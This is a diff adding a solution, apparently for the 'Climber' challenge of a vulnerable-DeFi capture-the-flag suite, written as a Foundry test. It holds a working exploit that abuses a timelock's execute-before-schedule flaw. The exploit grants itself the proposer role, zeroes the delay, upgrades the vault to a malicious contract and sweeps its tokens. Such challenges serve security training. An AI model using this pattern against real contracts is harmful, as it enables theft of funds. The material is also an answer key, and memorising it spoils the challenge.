@@ -85,7 +85,34 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        uint256 len = 4;
+        // 1. ClimberTimelock.execute
+        address[] memory targets = new address[](len);
+        uint256[] memory values = new uint256[](len);
+        bytes[] memory dataElements = new bytes[](len);
+        bytes32 salt = keccak256(abi.encodePacked(""));
+
+        Exploit e = new Exploit();
+        // 1-1. grantRole
+        targets[0] = address(timelock);
+        dataElements[0] = abi.encodeWithSelector(0x2f2ff15d, PROPOSER_ROLE, address(e));
+
+        // 1-2. updateDelay
+        targets[1] = address(timelock);
+        dataElements[1] = abi.encodeWithSelector(0x24adbc5b, 0);
+
+        // 1-3. ClimberVault.upgradeToAndCall
+        targets[2] = address(vault);
+        dataElements[2] = abi.encodeWithSelector(
+            0x4f1ef286, address(e), abi.encodeWithSelector(Exploit.sweep.selector, token, recovery)
+        );
+
+        // 1-end. Exploit.callSchedule(id helper)
+        targets[3] = address(e);
+        dataElements[3] =
+            abi.encodeWithSelector(Exploit.callSchedule.selector, timelock, targets, values, dataElements, salt);
+
+        timelock.execute(targets, values, dataElements, salt);
     }
 
     /**
@@ -94,5 +121,23 @@ contract ClimberChallenge is Test {
     function _isSolved() private view {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+    }
+}
+
+contract Exploit is ClimberVault, Test {
+    function callSchedule(
+        ClimberTimelock timelock,
+        address[] calldata targets,
+        uint256[] calldata values,
+        bytes[] memory dataElements,
+        bytes32 salt
+    ) public {
+        dataElements[dataElements.length - 1] =
+            abi.encodeWithSelector(this.callSchedule.selector, timelock, targets, values, dataElements, salt);
+        timelock.schedule(targets, values, dataElements, salt);
+    }
+
+    function sweep(DamnValuableToken token, address recovery) public {
+        token.transfer(recovery, token.balanceOf(address(this)));
     }
 }
